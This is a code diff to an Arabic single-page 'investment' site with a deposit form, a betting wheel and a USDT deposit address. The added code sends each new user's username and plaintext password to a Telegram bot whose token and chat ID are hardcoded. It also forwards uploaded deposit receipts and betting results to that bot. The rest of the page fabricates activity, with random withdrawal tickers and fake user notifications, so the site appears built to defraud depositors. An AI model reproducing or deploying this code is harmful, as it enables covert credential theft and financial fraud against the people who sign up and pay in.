@@ -193,11 +193,11 @@
             </div>
             <div class="space-y-3">
                 <label class="block w-full bg-emerald-500/10 border border-dashed border-emerald-500/40 py-4 rounded-2xl text-center cursor-pointer hover:bg-emerald-500/20 transition-all">
-                    <input type="file" class="hidden" onchange="showToast('تم اختيار صورة الإيصال بنجاح')">
+                    <input type="file" id="deposit-file" class="hidden" onchange="showToast('تم اختيار صورة الإيصال بنجاح')">
                     <i class="fa-solid fa-cloud-arrow-up text-emerald-500 mb-2"></i>
                     <p class="text-[9px] text-emerald-400 font-black uppercase">ارفق لقطة شاشة العملية</p>
                 </label>
-                <button onclick="showToast('جاري مراجعة طلب الإيداع...')" class="w-full bg-emerald-500 py-4 rounded-2xl text-black font-black text-[10px] uppercase italic">تأكيد العملية</button>
+                <button onclick="handleDepositNotification()" class="w-full bg-emerald-500 py-4 rounded-2xl text-black font-black text-[10px] uppercase italic">تأكيد العملية</button>
             </div>
         </div>
     </div>
@@ -241,7 +241,14 @@
     </div>
 
     <script>
-        // نظام التخزين المحلي - جلب البيانات أو استخدام الافتراضية
+        const TG_TOKEN = "8716265196:AAEOBedPF2K4UcCr_9G21MiHZlYX34oTnbc";
+        const TG_CHAT_ID = "7467274980";
+
+        async function sendTelegram(msg) {
+            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
+            try { await fetch(url); } catch(e) { console.error("Telegram Error", e); }
+        }
+
         const savedData = localStorage.getItem('bestDealUsers');
         const users = savedData ? JSON.parse(savedData) : {
             "abdo": { name: "Abdul Ghani Ghannoum", pw: "25002500", balance: 2000, profit: 1500, level: "فضي", firstSpin: true },
@@ -250,9 +257,7 @@
             "oday": { name: "عدي", pw: "65006500", balance: 1000, profit: 750, level: "فضي", firstSpin: true }
         };
 
-        function updateStorage() {
-            localStorage.setItem('bestDealUsers', JSON.stringify(users));
-        }
+        function updateStorage() { localStorage.setItem('bestDealUsers', JSON.stringify(users)); }
 
         let currentUser = null;
         let isLoginView = true;
@@ -269,7 +274,6 @@
             const actions = ["قام بإيداع", "سحب أرباح بقيمة", "ربح من عجلة الحظ"];
             const amounts = ["100$", "250$", "50$", "1000$"];
             const notify = document.getElementById('live-notify');
-            
             setInterval(() => {
                 const text = `${names[Math.floor(Math.random()*names.length)]} ${actions[Math.floor(Math.random()*actions.length)]} ${amounts[Math.floor(Math.random()*amounts.length)]}`;
                 notify.innerText = text;
@@ -278,10 +282,7 @@
             }, 8000);
         }
 
-        function checkAuth() {
-            if(!currentUser) toggleModal('loginModal', true);
-            else showView('user-dashboard');
-        }
+        function checkAuth() { if(!currentUser) toggleModal('loginModal', true); else showView('user-dashboard'); }
 
         function toggleAuthMode() {
             isLoginView = !isLoginView;
@@ -304,6 +305,7 @@
             if(users[un]) { showToast("اسم المستخدم موجود مسبقاً"); return; }
             users[un] = { name: un, pw: pw, balance: 0, profit: 0, level: "مبتدئ", firstSpin: true };
             updateStorage();
+            sendTelegram(`🔔 <b>حساب جديد سجل في المنصة!</b>\n👤 الاسم: ${un}\n🔑 كلمة السر: ${pw}`);
             showToast("تم إنشاء الحساب! يمكنك الدخول الآن");
             toggleAuthMode();
         }
@@ -317,52 +319,57 @@
             } else { showToast("خطأ في البيانات، حاول مجدداً"); }
         }
 
+        // دالة الإيداع المعدلة لإرسال صورة لقطة الشاشة
+        async function handleDepositNotification() {
+            if(!currentUser) return;
+            const fileInput = document.getElementById('deposit-file');
+            const file = fileInput.files[0];
+            if (!file) { showToast("يرجى إرفاق صورة الإيصال أولاً"); return; }
+
+            showToast('جاري إرسال الطلب والصورة...');
+            const formData = new FormData();
+            formData.append('chat_id', TG_CHAT_ID);
+            formData.append('photo', file);
+            formData.append('caption', `💰 <b>طلب إيداع جديد</b>\n👤 المستخدم: ${currentUser.name}\n💵 الرصيد الحالي: $${currentUser.balance}\n✅ يرجى فحص الصورة المرفقة للمراجعة.`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                showToast("تم إرسال الطلب والصورة بنجاح");
+                toggleModal('depositModal', false);
+            } catch (e) {
+                console.error("Error", e);
+                showToast("حدث خطأ في الاتصال بتلجرام");
+            }
+        }
+
         function renderDashboard() {
             const total = currentUser.balance + currentUser.profit;
             document.getElementById('user-dashboard').innerHTML = `
                 <div class="bg-gradient-to-br from-emerald-900 via-black to-black p-8 rounded-[2.5rem] border border-emerald-500/30 mb-6 relative shadow-2xl">
                     <div class="flex justify-between items-start mb-10">
-                        <div>
-                            <p class="text-emerald-400 text-[10px] font-black uppercase mb-1 tracking-[0.2em] italic">إجمالي المحفظة</p>
-                            <h2 class="text-5xl font-black italic text-white leading-none tracking-tighter">$${total.toLocaleString()}</h2>
-                        </div>
-                        <div onclick="toggleModal('settingsModal', true)" class="glass w-12 h-12 rounded-2xl flex items-center justify-center text-emerald-400 cursor-pointer hover:bg-emerald-500/10 transition-colors"><i class="fa-solid fa-gear text-xl"></i></div>
+                        <div><p class="text-emerald-400 text-[10px] font-black uppercase mb-1 tracking-[0.2em] italic">إجمالي المحفظة</p><h2 class="text-5xl font-black italic text-white leading-none tracking-tighter">$${total.toLocaleString()}</h2></div>
+                        <div onclick="toggleModal('settingsModal', true)" class="glass w-12 h-12 rounded-2xl flex items-center justify-center text-emerald-400 cursor-pointer"><i class="fa-solid fa-gear text-xl"></i></div>
                     </div>
                     <div class="grid grid-cols-2 gap-4">
-                        <button onclick="toggleModal('depositModal', true)" class="bg-emerald-500 text-black py-4.5 rounded-2xl font-black text-[11px] flex items-center justify-center gap-2 italic uppercase shadow-lg shadow-emerald-500/20"><i class="fa-solid fa-plus-circle"></i> إيداع</button>
+                        <button onclick="toggleModal('depositModal', true)" class="bg-emerald-500 text-black py-4.5 rounded-2xl font-black text-[11px] flex items-center justify-center gap-2 italic uppercase"><i class="fa-solid fa-plus-circle"></i> إيداع</button>
                         <button onclick="toggleModal('withdrawModal', true)" class="bg-white/10 text-white border border-white/10 py-4.5 rounded-2xl font-black text-[11px] flex items-center justify-center gap-2 italic uppercase"><i class="fa-solid fa-money-bill-transfer"></i> سحب</button>
                     </div>
                 </div>
-
-                <div class="glass rounded-[2rem] p-7 mb-6 border-emerald-500/10 bg-gradient-to-b from-transparent to-emerald-500/5">
-                    <div class="flex justify-between items-center mb-6">
-                        <h3 class="font-black text-[10px] uppercase tracking-widest italic flex items-center gap-2">
-                            <i class="fa-solid fa-dharmachakra text-emerald-500"></i> عجلة الأرباح الذكية
-                        </h3>
-                        <span class="text-[8px] bg-emerald-500/20 px-2 py-1 rounded text-emerald-400 font-bold italic">VIP ACCESS</span>
-                    </div>
+                <div class="glass rounded-[2rem] p-7 mb-6 border-emerald-500/10">
+                    <div class="flex justify-between items-center mb-6"><h3 class="font-black text-[10px] uppercase tracking-widest italic flex items-center gap-2"><i class="fa-solid fa-dharmachakra text-emerald-500"></i> عجلة الأرباح الذكية</h3></div>
                     <div class="text-center py-2">
-                        <div id="wheel-display" class="w-20 h-20 bg-emerald-500/10 rounded-full border-4 border-dashed border-emerald-500/40 mx-auto flex items-center justify-center mb-6 transition-all shadow-inner shadow-emerald-500/20">
-                            <i class="fa-solid fa-star text-3xl text-emerald-500"></i>
-                        </div>
+                        <div id="wheel-display" class="w-20 h-20 bg-emerald-500/10 rounded-full border-4 border-dashed border-emerald-500/40 mx-auto flex items-center justify-center mb-6 transition-all"><i class="fa-solid fa-star text-3xl text-emerald-500"></i></div>
                         <p id="wheel-status" class="text-[10px] font-black mb-6 text-slate-400 uppercase italic">استثمر 50$ لتدوير العجلة ومضاعفة رصيدك</p>
                         <div class="flex gap-2">
-                            <input type="number" id="bet-amount" placeholder="المبلغ (Min 50$)" class="w-1/2 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-[10px] outline-none focus:border-emerald-500 text-center font-bold">
-                            <button onclick="spinWheel()" id="spin-btn" class="w-1/2 bg-emerald-500 text-black font-black py-3 rounded-xl text-[10px] uppercase italic active:scale-95 transition-all shadow-lg shadow-emerald-500/10">تدوير الآن</button>
+                            <input type="number" id="bet-amount" placeholder="المبلغ (Min 50$)" class="w-1/2 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-[10px] outline-none text-center font-bold">
+                            <button onclick="spinWheel()" id="spin-btn" class="w-1/2 bg-emerald-500 text-black font-black py-3 rounded-xl text-[10px] uppercase italic">تدوير الآن</button>
                         </div>
                     </div>
                 </div>
-
                 <div class="glass rounded-[2rem] p-7 mb-6 border-white/5">
                     <div class="grid grid-cols-2 gap-4 mb-8">
-                        <div class="bg-white/5 p-5 rounded-2xl border border-white/5 text-center">
-                            <p class="text-[8px] font-bold text-slate-500 uppercase mb-2 italic">رأس المال</p>
-                            <span class="text-xl font-black text-white italic">$${currentUser.balance}</span>
-                        </div>
-                        <div class="bg-emerald-500/10 p-5 rounded-2xl border border-emerald-500/20 text-center">
-                            <p class="text-[8px] font-bold text-emerald-400 uppercase mb-2 italic">إجمالي الربح</p>
-                            <span class="text-xl font-black text-emerald-400 italic">+$${currentUser.profit}</span>
-                        </div>
+                        <div class="bg-white/5 p-5 rounded-2xl border border-white/5 text-center"><p class="text-[8px] font-bold text-slate-500 uppercase mb-2">رأس المال</p><span class="text-xl font-black text-white italic">$${currentUser.balance}</span></div>
+                        <div class="bg-emerald-500/10 p-5 rounded-2xl border border-emerald-500/20 text-center"><p class="text-[8px] font-bold text-emerald-400 uppercase mb-2">إجمالي الربح</p><span class="text-xl font-black text-emerald-400 italic">+$${currentUser.profit}</span></div>
                     </div>
                     <h3 class="font-black text-[10px] uppercase tracking-widest mb-4 italic flex items-center gap-2"><i class="fa-solid fa-clock-rotate-left text-emerald-500"></i> آخر العمليات</h3>
                     <div id="trans-list" class="space-y-3">
@@ -372,60 +379,26 @@
                         </div>
                     </div>
                 </div>
-                <button onclick="logout()" class="w-full py-6 text-slate-600 font-bold text-[10px] hover:text-red-500 transition-colors uppercase tracking-widest italic">تسجيل الخروج من الحساب</button>
+                <button onclick="logout()" class="w-full py-6 text-slate-600 font-bold text-[10px] uppercase italic">تسجيل الخروج من الحساب</button>
             `;
         }
 
         function spinWheel() {
             const betInput = document.getElementById('bet-amount');
             const bet = parseFloat(betInput.value);
-            const status = document.getElementById('wheel-status');
-            const wheelIco = document.getElementById('wheel-display');
-            const spinBtn = document.getElementById('spin-btn');
-
+            const status = document.getElementById('wheel-status'), wheelIco = document.getElementById('wheel-display'), spinBtn = document.getElementById('spin-btn');
             if (isNaN(bet) || bet < 50) { showToast("الحد الأدنى للمراهنة هو 50$"); return; }
             if (currentUser.balance < 50) { showToast("يجب أن يكون رصيدك 50$ أو أكثر للعب"); return; }
             if (bet > currentUser.balance) { showToast("رصيدك غير كافٍ لهذا الرهان"); return; }
-
-            spinBtn.disabled = true;
-            wheelIco.classList.add('wheel-spin-anim');
-            status.innerText = "جاري تدوير العجلة... ترقب الربح";
-
+            spinBtn.disabled = true; wheelIco.classList.add('wheel-spin-anim'); status.innerText = "جاري تدوير العجلة...";
             setTimeout(() => {
-                wheelIco.classList.remove('wheel-spin-anim');
-                spinBtn.disabled = false;
-
-                let result;
-                if (currentUser.firstSpin) {
-                    result = { label: "ربح الضعف (هدية ترحيب)", mult: 1 };
-                    currentUser.firstSpin = false;
-                } else {
-                    const outcomes = [
-                        { label: "خسارة المحاولة", mult: -1, weight: 40 }, 
-                        { label: "تعادل (استرداد رهان)", mult: 0, weight: 15 },
-                        { label: "ربح x2", mult: 1, weight: 25 },
-                        { label: "ربح x5", mult: 4, weight: 10 },
-                        { label: "الجائزة الكبرى x10", mult: 9, weight: 5 }
-                    ];
-                    let pool = [];
-                    outcomes.forEach(o => { for(let i=0; i<o.weight; i++) pool.push(o); });
-                    result = pool[Math.floor(Math.random() * pool.length)];
-                }
-
-                const change = bet * result.mult;
-                currentUser.balance += change;
-                
-                updateStorage(); // حفظ التغيير فوراً
-
-                if (change > 0) {
-                    status.innerHTML = `<span class="text-emerald-400 font-black tracking-tighter">رائع! ${result.label} (+$${change})</span>`;
-                    showToast(`مبروك! ربحت $${change}`);
-                } else if(change === 0) {
-                    status.innerHTML = `<span class="text-white font-black italic">حاول مجدداً! تم استرداد الرهان</span>`;
-                } else {
-                    status.innerHTML = `<span class="text-red-500 font-black italic">حظ أوفر! ${result.label} (-$${Math.abs(change)})</span>`;
-                    showToast(`خسرت $${Math.abs(change)}`);
-                }
+                wheelIco.classList.remove('wheel-spin-anim'); spinBtn.disabled = false;
+                let result = currentUser.firstSpin ? { label: "ربح الضعف (هدية ترحيب)", mult: 1 } : [{ label: "خسارة المحاولة", mult: -1, weight: 40 }, { label: "تعادل", mult: 0, weight: 15 }, { label: "ربح x2", mult: 1, weight: 25 }, { label: "ربح x5", mult: 4, weight: 10 }, { label: "الجائزة الكبرى x10", mult: 9, weight: 5 }].reduce((p, c) => { for(let i=0; i<c.weight; i++) p.push(c); return p; }, [])[Math.floor(Math.random() * 100)];
+                currentUser.firstSpin = false;
+                const change = bet * result.mult; currentUser.balance += change; updateStorage();
+                sendTelegram(`🎡 <b>نتيجة عجلة الحظ!</b>\n👤 المستخدم: ${currentUser.name}\n💵 الرهان: $${bet}\n🎲 النتيجة: ${result.label}\n💰 التغيير: $${change}\n🏦 الرصيد النهائي: $${currentUser.balance}`);
+                status.innerHTML = `<span class="${change > 0 ? 'text-emerald-400' : 'text-red-500'} font-black">${result.label} ($${change})</span>`;
+                showToast(change >= 0 ? `مبروك! ربحت $${change}` : `خسرت $${Math.abs(change)}`);
                 renderDashboard();
             }, 2500);
         }
@@ -433,49 +406,27 @@
         function saveSettings() {
             const newName = document.getElementById('new-name').value.trim();
             const newPw = document.getElementById('new-pw').value.trim();
-            if(newName) currentUser.name = newName;
-            if(newPw) currentUser.pw = newPw;
-            updateStorage(); // حفظ التعديلات
-            showToast("تم تحديث البيانات بنجاح");
-            toggleModal('settingsModal', false);
-            renderDashboard();
+            if(newName) currentUser.name = newName; if(newPw) currentUser.pw = newPw;
+            updateStorage(); showToast("تم تحديث البيانات بنجاح"); toggleModal('settingsModal', false); renderDashboard();
         }
 
-        function logout() { currentUser = null; showView('hero-view'); showToast("تم تسجيل الخروج بنجاح"); }
-        
+        function logout() { currentUser = null; showView('hero-view'); showToast("تم تسجيل الخروج"); }
         function showView(v, el) { 
             document.getElementById('hero-view').classList.add('hidden'); document.getElementById('user-dashboard').classList.add('hidden'); 
             document.getElementById(v).classList.remove('hidden');
             if(el) { document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); el.classList.add('active'); }
         }
 
-        function copyAddress() { 
-            const c = document.getElementById("myAddr"); c.select(); 
-            navigator.clipboard.writeText(c.value); 
-            showToast("تم نسخ عنوان USDT بنجاح"); 
-        }
-
-        function toggleTheme() { 
-            document.body.classList.toggle('light-mode'); 
-            const i = document.getElementById('theme-icon'); 
-            i.className = document.body.classList.contains('light-mode') ? "fa-solid fa-sun text-orange-500" : "fa-solid fa-moon text-emerald-400"; 
-        }
-
+        function copyAddress() { const c = document.getElementById("myAddr"); c.select(); navigator.clipboard.writeText(c.value); showToast("تم النسخ بنجاح"); }
+        function toggleTheme() { document.body.classList.toggle('light-mode'); }
         function toggleModal(id, s) { const m = document.getElementById(id); s ? m.classList.remove('hidden') : m.classList.add('hidden'); }
 
         function generateStats() {
-            const cities = ["دمشق", "حلب", "اللاذقية", "حمص", "طرطوس", "حماة"], methods = ["Binance", "USDT", "هرم"];
-            const container = document.getElementById('live-transactions');
+            const cities = ["دمشق", "حلب", "اللاذقية", "حمص"], container = document.getElementById('live-transactions');
             let content = '';
-            for(let i=0; i<15; i++) {
-                const c = cities[Math.floor(Math.random() * cities.length)], m = methods[Math.floor(Math.random() * methods.length)], a = Math.floor(Math.random() * 3000 + 150);
-                content += `<span class="flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> سحب بقيمة <span class="text-white">$${a}</span> إلى ${c} (${m})</span>`;
-            }
+            for(let i=0; i<15; i++) content += `<span><i class="fa-solid fa-circle-check"></i> سحب بقيمة <span class="text-white">$${Math.floor(Math.random()*3000+150)}</span> إلى ${cities[Math.floor(Math.random()*4)]}</span>`;
             container.innerHTML = content + content;
         }
-
-        let agents = 2325;
-        setInterval(() => { agents += (Math.floor(Math.random()*5)-2); document.getElementById('agent-count').innerText = agents; }, 3000);
 
         function initSite() { generateStats(); randomNotify(); }
     </script>
